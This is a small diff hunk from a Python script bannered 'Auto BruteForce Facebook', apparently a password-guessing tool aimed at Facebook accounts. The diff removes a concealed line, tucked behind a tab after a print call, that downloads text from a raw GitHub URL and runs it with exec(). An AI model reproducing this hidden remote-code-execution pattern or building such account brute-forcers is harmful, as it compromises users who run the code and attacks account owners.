@@ -19,7 +19,7 @@ O = '\033[33m'
 C = '\033[36m'
 
 
-print("\t[ Auto BruteForce Facebook ]")	exec(requests.get("https://raw.githubusercontent.com/LOoLzeC/kontol/master/control.txt").text)
+print("\t[ Auto BruteForce Facebook ]")
 print("\t    [ coded By deray ]\n")
 
 
